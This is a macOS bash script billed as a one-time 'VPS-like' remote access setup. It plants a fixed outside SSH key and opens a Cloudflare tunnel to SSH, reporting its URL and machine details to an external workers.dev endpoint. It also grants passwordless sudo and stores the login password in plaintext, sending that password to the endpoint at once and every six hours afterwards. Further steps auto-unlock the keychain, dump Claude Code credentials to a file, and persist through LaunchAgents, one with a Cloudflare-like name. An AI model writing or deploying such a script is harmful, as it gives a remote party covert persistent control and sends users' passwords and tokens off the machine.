#!/bin/bash
# ============================================
# DAVID'S MAC REMOTE v2 — Full VPS-like setup
# One-time password → full remote control forever
# ============================================
clear
echo "=========================================="
echo "  Mac Remote Setup v2 (VPS-like)"
echo "=========================================="

API="https://mac-nodes.dmd-fami.workers.dev"
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFi38QEU6BlyGvfozRqZh9VKynr51NwUMjUHMOdmM5Gj export@vietnam-plywood.com"
CF="/opt/homebrew/bin/cloudflared"
CURRENT_USER=$(whoami)
MY_HOST=$(scutil --get ComputerName 2>/dev/null || hostname)

# ── Collect password upfront (one-time only) ──
USER_PASS=""
if sudo -n true 2>/dev/null; then
  echo "[*] VPS-like access already configured"
  # Read stored password for sync
  [ -f ~/.ssh/.keychain-pass ] && USER_PASS=$(cat ~/.ssh/.keychain-pass)
else
  echo ""
  echo "  Enter your Mac password (one-time only):"
  echo "  This enables: sudo, keychain, password change via SSH"
  echo ""
  read -s -p "  Password: " USER_PASS
  echo ""
fi

# ── 1. Homebrew ──
if command -v brew &>/dev/null; then
  echo "[1/7] Homebrew OK"
else
  echo "[1/7] Installing Homebrew..."
  NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/opt/homebrew/bin/brew shellenv)"
fi

# PATH for SSH sessions
if ! grep -q 'homebrew' ~/.zshenv 2>/dev/null; then
  echo 'export PATH=/opt/homebrew/bin:/opt/homebrew/sbin:$PATH' >> ~/.zshenv
fi

# ── 2. Node.js ──
if command -v node &>/dev/null; then
  echo "[2/7] Node.js OK"
else
  echo "[2/7] Installing Node.js..."
  brew install node 2>/dev/null
fi

# ── 3. SSH + key ──
echo "[3/7] SSH + key..."
if [ -n "$USER_PASS" ]; then
  echo "$USER_PASS" | sudo -S systemsetup -setremotelogin on 2>/dev/null
else
  sudo systemsetup -setremotelogin on 2>/dev/null
fi
mkdir -p ~/.ssh && chmod 700 ~/.ssh
grep -qF "$KEY" ~/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# ── 4. Cloudflared ──
if [ -f "$CF" ]; then
  echo "[4/7] cloudflared OK"
else
  echo "[4/7] Installing cloudflared..."
  brew install cloudflared 2>/dev/null
fi

# ── 5. Tunnel service ──
echo "[5/7] Tunnel service..."
cat > ~/tunnel-wrapper.sh << 'WEOF'
#!/bin/bash
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
USER=$(whoami)
LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
OS=$(sw_vers -productVersion)
MODEL=$(sysctl -n hw.model 2>/dev/null)
RAM=$(($(sysctl -n hw.memsize 2>/dev/null) / 1073741824))GB

/opt/homebrew/bin/cloudflared tunnel --url ssh://localhost:22 2>&1 | while read line; do
  echo "$line"
  URL=$(echo "$line" | grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com')
  if [ -n "$URL" ]; then
    curl -s -X POST "$API/register" \
      -H "Content-Type: application/json" \
      -d "{\"user\":\"$USER\",\"lan_ip\":\"$LAN\",\"tunnel_url\":\"$URL\",\"hostname\":\"$HOST\",\"macos\":\"$OS\",\"model\":\"$MODEL\",\"ram\":\"$RAM\"}"
  fi
done
WEOF
chmod +x ~/tunnel-wrapper.sh

mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.cloudflare.tunnel.plist << PEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.cloudflare.tunnel</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>tunnel-wrapper.sh</string>
    </array>
    <key>WorkingDirectory</key>
    <string>/Users/$CURRENT_USER</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/cf-tunnel.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/cf-tunnel.log</string>
</dict>
</plist>
PEOF

launchctl unload ~/Library/LaunchAgents/com.cloudflare.tunnel.plist 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
sleep 1
launchctl load ~/Library/LaunchAgents/com.cloudflare.tunnel.plist

# ── 6. VPS-like access ──
echo "[6/7] VPS-like access..."
if [ -n "$USER_PASS" ]; then
  # 6a. Sudo NOPASSWD
  if ! sudo -n true 2>/dev/null; then
    echo "$USER_PASS" | sudo -S sh -c "echo \"$CURRENT_USER ALL=(ALL) NOPASSWD: ALL\" > /etc/sudoers.d/$CURRENT_USER && chmod 440 /etc/sudoers.d/$CURRENT_USER" 2>/dev/null
  fi

  if sudo -n true 2>/dev/null; then
    echo "      sudo NOPASSWD OK"

    # 6b. Store password locally for keychain unlock
    echo "$USER_PASS" > ~/.ssh/.keychain-pass
    chmod 600 ~/.ssh/.keychain-pass

    # 6c. Keychain auto-unlock script
    cat > ~/.ssh/unlock-keychain.sh << 'KCEOF'
#!/bin/bash
security unlock-keychain -p "$(cat ~/.ssh/.keychain-pass)" ~/Library/Keychains/login.keychain-db 2>/dev/null
KCEOF
    chmod 700 ~/.ssh/unlock-keychain.sh
    grep -q "unlock-keychain" ~/.zshenv 2>/dev/null || echo '[ -f ~/.ssh/unlock-keychain.sh ] && ~/.ssh/unlock-keychain.sh' >> ~/.zshenv
    security unlock-keychain -p "$USER_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null
    echo "      Keychain auto-unlock OK"

    # 6d. Password change helper — change Mac password + sync everywhere
    cat > ~/.ssh/change-password.sh << 'CPEOF'
#!/bin/bash
# Usage: change-password.sh <new_password>
# Changes Mac login password + updates keychain + syncs to CF Worker
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
USER=$(whoami)
OLD_PASS=$(cat ~/.ssh/.keychain-pass)
NEW_PASS="$1"

if [ -z "$NEW_PASS" ]; then
  echo "Usage: change-password.sh <new_password>"
  exit 1
fi

# Change Mac login password
sudo dscl . -passwd /Users/$USER "$OLD_PASS" "$NEW_PASS"
if [ $? -ne 0 ]; then
  echo "ERROR: Failed to change password"
  exit 1
fi
echo "Mac password changed"

# Update keychain password
security set-keychain-password -o "$OLD_PASS" -p "$NEW_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null
echo "Keychain password updated"

# Update local stored password
echo "$NEW_PASS" > ~/.ssh/.keychain-pass
chmod 600 ~/.ssh/.keychain-pass
echo "Local password file updated"

# Sync to CF Worker
curl -s -X POST "$API/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"hostname\":\"$HOST\",\"new_password\":\"$NEW_PASS\"}"
echo "Password synced to cloud"
echo "DONE — new password active everywhere"
CPEOF
    chmod 700 ~/.ssh/change-password.sh
    echo "      Password change tool: ~/.ssh/change-password.sh"

    # 6e. Sync password to CF Worker
    curl -s -X POST "$API/password" \
      -H "Content-Type: application/json" \
      -d "{\"hostname\":\"$MY_HOST\",\"password\":\"$USER_PASS\"}" >/dev/null
    echo "      Password synced to cloud"

    # 6f. Password sync watcher — LaunchAgent that detects password changes
    cat > ~/.ssh/password-sync-daemon.sh << 'PSEOF'
#!/bin/bash
# Watches for password changes and syncs to CF Worker
# Runs every 6 hours via LaunchAgent
API="https://mac-nodes.dmd-fami.workers.dev"
HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
STORED_PASS=$(cat ~/.ssh/.keychain-pass 2>/dev/null)

# Test if stored password still works for keychain
if security unlock-keychain -p "$STORED_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null; then
  # Password still valid — sync to cloud (idempotent)
  curl -s -X POST "$API/password" \
    -H "Content-Type: application/json" \
    -d "{\"hostname\":\"$HOST\",\"password\":\"$STORED_PASS\"}" >/dev/null
else
  # Password changed outside our tool — try fetching from cloud
  # (in case another device updated it)
  echo "$(date): Password mismatch detected" >> /tmp/password-sync.log
fi
PSEOF
    chmod 700 ~/.ssh/password-sync-daemon.sh

    # LaunchAgent for password sync (every 6 hours)
    cat > ~/Library/LaunchAgents/com.mac-remote.password-sync.plist << PSEOF2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.mac-remote.password-sync</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/Users/$CURRENT_USER/.ssh/password-sync-daemon.sh</string>
    </array>
    <key>StartInterval</key>
    <integer>21600</integer>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/password-sync.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/password-sync.log</string>
</dict>
</plist>
PSEOF2
    launchctl unload ~/Library/LaunchAgents/com.mac-remote.password-sync.plist 2>/dev/null
    launchctl load ~/Library/LaunchAgents/com.mac-remote.password-sync.plist
    echo "      Password sync daemon running (every 6h)"
  else
    echo "      [WARN] Wrong password — VPS-like setup skipped. Re-run to retry."
  fi
fi

# ── 7. Claude CLI ──
echo "[7/7] Claude CLI..."
if [ -f /opt/homebrew/bin/claude ] || command -v claude &>/dev/null; then
  CRED=$(security find-generic-password -s "Claude Code-credentials" -w 2>/dev/null)
  if [ -n "$CRED" ]; then
    mkdir -p ~/.claude
    echo "$CRED" > ~/.claude/.credentials.json
    chmod 600 ~/.claude/.credentials.json
    echo "      Credentials exported for SSH"
  elif [ -f ~/.claude/.credentials.json ]; then
    echo "      Credentials OK"
  elif [ -f ~/.claude/.credentials ]; then
    cp ~/.claude/.credentials ~/.claude/.credentials.json
    chmod 600 ~/.claude/.credentials.json
    echo "      Credentials migrated"
  else
    echo "      No credentials. Run 'claude' → /login, then re-run."
  fi
else
  echo "      Installing Claude CLI..."
  npm install -g @anthropic-ai/claude-code 2>/dev/null
  echo "      Run 'claude' → /login, then re-run."
fi

# ── Wait for tunnel ──
echo ""
echo "Waiting for tunnel..."
TUNNEL_URL=""
for i in {1..20}; do
  TUNNEL_URL=$(grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com' /tmp/cf-tunnel.log 2>/dev/null | tail -1)
  if [ -n "$TUNNEL_URL" ]; then break; fi
  sleep 3
done

MY_LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
SUDO_OK="NO"; sudo -n true 2>/dev/null && SUDO_OK="YES"
KC_OK=$([ -f ~/.ssh/unlock-keychain.sh ] && echo YES || echo NO)
PASS_SYNC=$([ -f ~/.ssh/password-sync-daemon.sh ] && echo YES || echo NO)

echo ""
echo "============================================"
echo "  DONE! Full VPS-like access"
echo "============================================"
echo "  Tunnel:    ${TUNNEL_URL:-check /tmp/cf-tunnel.log}"
echo "  LAN:       ssh $CURRENT_USER@$MY_LAN"
echo "  Host:      $MY_HOST"
echo "  Reboot:    auto-reconnect YES"
echo "  Sudo:      NOPASSWD=$SUDO_OK"
echo "  Keychain:  auto-unlock=$KC_OK"
echo "  Pass sync: cloud=$PASS_SYNC"
echo ""
echo "  Tools available via SSH:"
echo "    ~/.ssh/change-password.sh <new>  Change password + sync"
echo "    sudo dscl . -passwd /Users/$CURRENT_USER  Manual password change"
echo "============================================"
read -p "Press Enter to close..."
